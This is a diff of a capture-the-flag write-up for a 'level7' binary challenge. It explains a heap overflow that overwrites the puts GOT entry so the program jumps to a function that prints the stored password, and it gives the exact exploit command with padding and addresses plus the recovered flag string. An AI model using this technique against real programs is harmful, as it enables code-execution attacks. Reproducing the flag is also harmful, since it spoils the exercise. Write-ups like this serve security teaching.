@@ -1,8 +1,33 @@
-# We got a write-what-where situation here.
-# We provoke an overflow into the first chunck to overwrite the following one with a GOT address (puts one).
-# Then the 2nd strcpy will write inside the GOT address the value of the second argument (m() address).
-# Our crafted GOT address is then called instead of puts() function (the end of the main function).
-# This new GOT address redirect to the "m" function that will display the content of fgets (the password) for us.
+## Analysis
+
+The program calls malloc() twice, each time with a size of eight. Then copy into the first one the first argument, and the same for the other.
+More, a fgets() is called with the path to password as argument and bufferized.
+
+`0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax`
+`0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44`
+`0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960`
+`0x080485eb <+202>:   call   0x80483c0 <fgets@plt>`
+
+At the end puts() is called with a meaningless string.
+
+## Exploit
+
+Memory corruption : memory chunks are sequentials, so we can override the following chunk we a user-provided address and then altercate the behavior of the program.
+
+## Crafting
+
+0		      20                  24   0               4
+[RANDOM_PADDING_STRING][TARGET_MEMORY_ADDR]    [TARGET_NEW_ADDR]
+			^		^            |
+			| 1.strcpy(1st) |            | 2.strcpy(2st)
+------------------------- 		--------------
+
+We provoke an overflow into the first chunck to overwrite the following one with a GOT address (puts one)
+Then the 2nd strcpy will write inside the GOT address the value of the second argument (m() address).
+Our crafted GOT address is then called instead of puts() function (the end of the main function).
+This new GOT address redirect to the "m" function that will display the content of fgets (the password) for us.
+
+## Shooting
 
 ./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
